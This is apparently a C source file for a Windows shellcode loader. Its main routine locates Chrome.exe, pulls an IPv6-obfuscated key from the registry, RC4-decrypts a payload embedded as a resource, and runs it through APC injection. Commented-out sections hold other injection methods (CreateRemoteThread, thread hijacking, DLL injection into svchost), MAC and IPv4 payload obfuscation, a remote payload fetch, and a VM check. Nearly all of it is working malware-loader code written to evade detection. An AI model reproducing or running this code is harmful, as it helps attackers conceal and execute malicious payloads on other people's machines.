#include "main.h"
typedef void(WINAPI* pdllMainFunction)();
int main()
{
	HANDLE hProcess = 0, hProcess1 = 0, hProcess2 = 0, hThread = 0, hThread1 = 0;
	DWORD  dwPID0 = 0, dwPID1 = 0, dwPID2 = 0, dwOldProtections = 0, dwThreadId;
	PUCHAR pObfInput = NULL, * pObfOutput = NULL, pKey = NULL, pExtPayloadAddres = NULL;
	SIZE_T sBytesWritten = 0, sPaddedInputSize = 64, sObfuscatedSize = 0, sClearPayload = 0, sOriginalInputSize = 64;
	Context RC4Context_t;
	RESOURCE resource;
	PVOID pExPayload, pMain;
	LPWSTR TargetProcessName = L"Chrome.exe";

	if (!EnumProcessNTQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess)) 
	{
		wprintf(L"[!] Enumerate Processes Nt Query System Information Failed to Find %s\n", TargetProcessName);
		return -1;
	}
	wprintf(L"[i] Found %s Process with id %d\n", TargetProcessName, dwPID0);
	//if(!FetchRemoteThreadHandle(dwPID0, &dwThreadId, &hThread)) wprintf(L"[!] Failed to fetch a remote thread handle and id wis Error Code: %lx\n", GetLastError());
	
	if(!FetchLocalAllertableThread(GetCurrentThreadId(), &dwThreadId, &hThread)) return -2;
	//printf("[i] Found a Thread! Thread Id: %lu\n[!] Starting A Test Run...\n", dwThreadId);

	

	if(!ReadRegKeys(&pObfOutput, &sObfuscatedSize)) return -1;

	if (!(pKey = LocalAlloc(LPTR,256))) return -2;

	if (!DeobfuscatePayloadIPv6(
		(PUCHAR*)&pKey, 
		pObfOutput, 
		sObfuscatedSize + 1,
		&sClearPayload, 
		(unsigned char)(sPaddedInputSize - sOriginalInputSize)
	)) return -3;

	strcat_s((char*)pKey, 256, "\n");

	if (!FetchResource(&resource)) return -5;

	PAYLOAD pPayload_t = {
		.pText = LocalAlloc(LPTR, resource.sSize),
		.sText = resource.sSize
	};

	if (!rInit(&RC4Context_t, pKey, strlen((CHAR*)pKey))) return -6;

	rFin(&RC4Context_t, resource.pAddress, pPayload_t.pText, resource.sSize);

	Sleep(200);

	if (!APCPayloadInjection(hThread, pPayload_t.pText, pPayload_t.sText)) return -6;

	//if (!InjectRemoteProcessShellcode(hProcess, pPayload_t.pText, pPayload_t.sText, &pExPayload))printf("[!] Failed To Inject Shellcode!\n");

	//printf("Injecting Shellcode At Address: 0x%p\n", pExPayload);

	//HijackThread(hThread, pExPayload);

	CloseHandle(hThread);
	CloseHandle(hProcess);
	wprintf(L"[!] Finished!\n");
	char pPath[MAX_PATH] = { '\0' };

	//printf("[#] Payload Created Successfully! :)\n");
	printf("[#] Press 'Enter' To Exit! :)");
	Sleep(200 * 10);
	return 0;
}
	/*
	if (!FetchLocalThreadHandle(
		GetCurrentThreadId(),
		&dwPID2,
		&hThread1)
		)return -4;
	*/
	//CreateSacrificialThread(&dwThreadId, &hThread1);

	//HijackLocalThread(hThread1, pPayload_t.pText, pPayload_t.sText);

	/*if (!CreateSuspendedProcess(
		"Notepad.exe",
		&dwPID0,
		&hProcess,
		&hThread
	)) return -7;
	
	if (!InjectRemoteProcessShellcode(
		hProcess, 
		pPayload_t.pText, 
		pPayload_t.sText, 
		(PVOID *)&pExtPayloadAddres
	)) return -8;

	if (!HijackThread(
		hThread1, 
		pExtPayloadAddres
	))return -9;
	*/
	/*

	HijackLocalThread(hThread, pPayload_t.pText, pPayload_t.sText);

	if (!ResumeThread(hThread)) return  -4;

	WaitForSingleObject(hThread, INFINITE);

	if (!(pExPayload = VirtualAllocEx(hProcess, 0, pPayload_t.sText, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)))return -8;

	if (!WriteProcessMemory(hProcess, pExPayload, pPayload_t.pText, pPayload_t.sText, &sBytesWritten)) printf("[x] WriteProcessMemory Failed!\n");

	printf("Retrieved Payload: %s\n", (char*)pPayload_t.pText);

	RtlSecureZeroMemory(pPayload_t.pText, resource.sSize + 1);

	if (!VirtualProtectEx(hProcess, pExPayload, pPayload_t.sText, PAGE_EXECUTE, &dwOldProtections)) return -5;

	if (!(hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pExPayload, NULL, 0, 0))) return -6;
	*/
	
	//RtlSecureZeroMemory(pKey, strlen((char *)pKey));

	//if (!(dwPID0 = GetCurrentProcessId())) return -3;

	//if ((hProcess =OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID0)) == INVALID_HANDLE_VALUE) return -2;

	//if (!EnumRemoteProcessHandle(L"Notepad.exe", &dwPID0, &hProcess)) printf("[!] Enumerate Remote Processes Handles Failed To Find Chrome\n");

	//hProcess2 = FetchProcess(L"Notepad.exe", &pid2);

	//if (!(hThread= CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&FetchDrives,  NULL, CREATE_SUSPENDED, &dwThreadId))) return FALSE;

	//CheckVM();

 	//if (system("pause"))printf("f\n");

	//LPWSTR ProcessName = LocalAlloc(LPTR, 128);

	//memcpy(ProcessName,(L"Notepad.exe"), sizeof(WCHAR) * wcslen(L"Notepad.exe\0"));

	//printf("[i] Reached End Of Searching.\n");
	
	//*Initiate Payload Obfuscation

	//if (!(pObfInput = LocalAlloc(LPTR, 129))) return -1;

	//memset(pObfInput, '\0', 129);

	// strlen((char *)pObfInput),
	
	//size_t sPaddedInputSize = 64, ;

	//pClearPayload = LocalAlloc(LPTR, sClearPayload + 1);
	/*
	 * MACFuscation
	 *
	size_t sOriginalInputSize = strlen((char *)pObfInput), sPaddedInputSize = 0, sObfuscatedSize = 0, sClearPayload = 0;
	
	printf("[i] MAC Input: %s\n[i] IPv6 Input's Length: %zu\n", (char *)pObfInput, sOriginalInputSize);

	for (int i = 0; i < 48; i++) printf("--");

	printf("\n");

	ObfuscatePayloadMAC(pObfInput, &pObfOutput, sOriginalInputSize, &sPaddedInputSize, &sObfuscatedSize);

	printf("[i] MAC  Obfuscated Output:\n");

	for (int i = 0; i < (int)(sPaddedInputSize / MAC); i++) printf("\t[%d] -  %s | Output Length:%zu\n", i, (char*)pObfOutput[i], strlen((char*)pObfOutput[i]));

	//RtlMacToStrA((char **)pObfOutput, (int)(sPaddedInputSize / MAC), (unsigned char)(sPaddedInputSize - sOriginalInputSize),&pClearPayload, &sClearPayload);

	DeobfuscatePayloadMAC(&pClearPayload, pObfOutput, sObfuscatedSize, &sClearPayload, (Uchar)(sPaddedInputSize - sOriginalInputSize));

	printf("\n[i] MAC Deobfuscated Output: %s\n[i] MAC Deobfuscated Output's Length:%zu\n", (char *)pClearPayload, strlen((char*)pClearPayload));

	for (int i = 0; i < 48; i++) printf("--");

	printf("\n");
	*/
	/*IPv4Fuscation

	printf("[i] IPv4 Input: %s\n[i] IPv6 Input's Length: %zu\n", (char *)pObfInput, sOriginalInputSize);

	for (int i = 0; i < 48; i++) printf("--");

	printf("\n");

	ObfuscatePayloadIPv4(pObfInput, &pObfOutput, sOriginalInputSize, &sPaddedInputSize, &sObfuscatedSize);

	printf("[i] IPv4 Obfuscated Output:\n");

	for (int i = 0; i < (int)(sPaddedInputSize/IPv4); i++) printf("\t[%d] -  %s | Output Length:%zu\n", i, (char *)pObfOutput[i], strlen((char*)pObfOutput[i]));

	for (int i = 0; i < 48; i++) printf("--");

	printf("\n");

	//RtlIpv4toStrA(pObfOutput, (int)(sPaddedInputSize / IPv4), (unsigned char)(sPaddedInputSize - sOriginalInputSize), &pClearPayload, &sClearPayload);

	DeobfuscatePayloadIPv4(&pClearPayload, pObfOutput, sObfuscatedSize, &sClearPayload, (unsigned char)(sPaddedInputSize - sOriginalInputSize));

	printf("\n[i] IPv4 Deobfuscated Output: %s\n[i] IPv4 Deobfuscated Output's Length:%zu\n", (char *)pClearPayload, strlen((char*)pClearPayload));

	for (int i = 0; i < 48; i++) printf("--");

	printf("\n");
	*/
	//Ipv6Fuscation
	//printf("[i] IPv6 Input: %s\n[i] IPv6 Input's Length: %zu\n", (*pObfInput), sOriginalInputSize);
	//size_t NumberOfElements = sObfuscatedSize / (IPv6Arr - 1);
	//for (int i = 0; i < 48; i++) printf("--");

	//printf("\n");

	//ObfuscatePayloadIPv6(pObfInput, &pObfOutput, sOriginalInputSize, &sPaddedInputSize, &sObfuscatedSize);

	//printf("[i] IPv6 Obfuscated Output:\n");

	//for (size_t i = 0; i < NumberOfElements; i++) { printf("\t[%d] -  %s | Output Length:%zu\n", i, (char*)pObfOutput[i], strlen((char*)pObfOutput[i])); }

	//RtlIpv6ToStrA((char**)pObfOutput, (int)(sPaddedInputSize / IPv6), (unsigned char)(sPaddedInputSize - sOriginalInputSize), &pClearPayload, &sClearPayload);
	
	//for (size_t i = 0; i < strlen(testcase); i++) {if ((UCHAR)testcase[i] != pKeysetup[i]) { printf(" [! %zu]", i); return -4;}}

	//strcat_s(pKey, 256, "\n");


	//CloseHandle(hProcess);

/*

	SIZE_T sPayload = 0;

	PBYTE pPayload;

	if (!FetchPayloadHttpDynamic(L"http://127.0.0.1:8000/Resources/Test1.jpg", &pPayload, &sPayload)) printf("[x] Failed :(\n");

	else printf("[!] Success\n");

	DWORD dwProcessId;

	lpPAYLOAD pText_t;

	HANDLE hProcess;

	RESOURCE resource;

	if (!FetchResource(&resource)) return -1;

	if (!EnumRemoteProcessHandle(L"svchost.exe", &dwProcessId, &hProcess)) return -2;

	//if ((hProcess = FetchProcess(L"notepad.exe", &dwProcessId)) == INVALID_HANDLE_VALUE) { printf("Couldn't Find it:(\n"); }

	//if (!InjectDll(hProcess, L"C:\\Users\\mikmu\\Desktop\\DLL.dll")) return -2;


	//WritePayloadToRegistery(resource.pAddress, (DWORD) resource.sSize);

	//call();

	//Test();

	if (!(pText_t = Test())) return -5;

	if (!InjectShellcode(hProcess, (PBYTE)pText_t->pText, pText_t->sText)) return -6;

	unsigned char *pK[256] = {'\0'};

	printf("[!] Enter Your Key Please:\n");

	fgets(pK, 255, stdin);

	unsigned char *pDecryptedPayload = malloc(pText_t->sText);

	Context context_t;
	*/

	//if (!VirtualProtectEx(hProcess, pExPayload, pPayload_t.sText, dwOldProtections, &dwOldProtections)) return - 7;

	//BOOL State = WriteProcessMemory(hProcess, pExPayload, "\0", pPayload_t.sText, &sBytesWritten);
	//printf("%d" ,State);

	//printf("\n[i] IPv6 Deobfuscated Output: %s\n[i] IPv6 Deobfuscated Output's Length:%zu\n", (char *)pKey, strlen((char*)pKey));

	//for (int i = 0; i < 48; i++) printf("--");

	//printf("\n");
	/*/



	//printf("[i] Payload in main: %s\n[i] Payload Heap Address: 0x%p\n[!] Decrypting Payload...\n",pText_t->pText, pText_t->pText);

	//DWORD dwOldRights;

	//if (!VirtualProtect(pText_t->pText, pText_t->sText, PAGE_EXECUTE_READ, &dwOldRights)) return -2;

	//DWORD dwThreadPid;

	//HANDLE hThread = CreateThread(NULL, 0, pText_t->pText, NULL, 0, &dwThreadPid);

	WCHAR pPath[MAX_PATH] = { L'\0' };

	FetchDrives(pPath);

	if (!pPath[0]) {printf("[X] Failed To Fetch Drives!\n[X] Exiting With Error Code: %x\n", GetLastError()); return -1;}

	PrintDrives(pPath);

	while (!UserInputDrives(pPath)) { printf("[X] Wrong Input!\n"); PrintDrives(pPath);}

	PrintCWD(pPath);

	WIN32_FIND_DATA_ARRAYW *pFiles_arr_t = FetchFileArrayW(pPath);

	if (pFiles_arr_t == NULL)
	{
		printf("[X] Fetching Folders Failed\nError Code:0x%.8x\n", GetLastError());
		return -2;
	}

	PrintFilesArrayW(pFiles_arr_t);

	UserInputFolders(pPath, pFiles_arr_t);

	while (!UserInputContinueFolders()) {

		if (pFiles_arr_t == NULL) {
			printf("[!] No Files Under Current Folder.\n");
			break;
		}
		FreeFileArray(pFiles_arr_t);

		pFiles_arr_t = FetchFileArrayW(pPath);

		PrintCWD(pPath);

		PrintFilesArrayW(pFiles_arr_t);

		UserInputFolders(pPath, pFiles_arr_t);
	}

	PrintCWD(pPath);
	wprintf(L"File Name: %s", pFiles_arr_t->pFilesArr[0].pFileName);


	if(pFiles_arr_t != NULL)FreeFileArray(pFiles_arr_t);
	HANDLE hFile = INVALID_HANDLE_VALUE;
/*
 * GENERIC_READ = 0x80000000
 * GENERIC_WRITE = 0x40000000. (0d1073741824).
 * GENERIC_READ | GENERIC_WRITE = 0xC0000000. (0d3221225472).
 */
